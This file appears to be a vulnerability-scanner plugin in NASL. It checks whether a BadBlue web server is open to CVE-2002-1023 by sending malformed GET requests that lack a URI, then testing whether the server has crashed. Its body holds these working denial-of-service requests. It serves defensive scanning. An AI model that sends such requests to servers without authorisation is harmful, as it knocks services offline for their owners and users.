if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11062" );
	script_version( "2020-02-03T13:52:45+0000" );
	script_tag( name: "last_modification", value: "2020-02-03 13:52:45 +0000 (Mon, 03 Feb 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 5187 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-1023" );
	script_name( "BadBlue invalid GET DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_badblue_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "badblue/detected" );
	script_tag( name: "summary", value: "It was possible to kill the web server by
  sending an invalid GET request (without any URI)" );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make your web server
  crash continually." );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE = "cpe:/a:working_resources_inc.:badblue";
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r1 = NASLString( "GET HTTP/1.0\\r\\n", "Host: ", get_host_ip(), "\\r\\n\\r\\n" );
send( socket: soc, data: r1 );
http_recv( socket: soc );
close( soc );
sleep( 1 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r2 = NASLString( "GET  HTTP/1.0\\r\\n", "Host: ", get_host_ip(), "\\r\\n\\r\\n" );
send( socket: soc, data: r2 );
http_recv( socket: soc );
http_close_socket( soc );
sleep( 1 );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

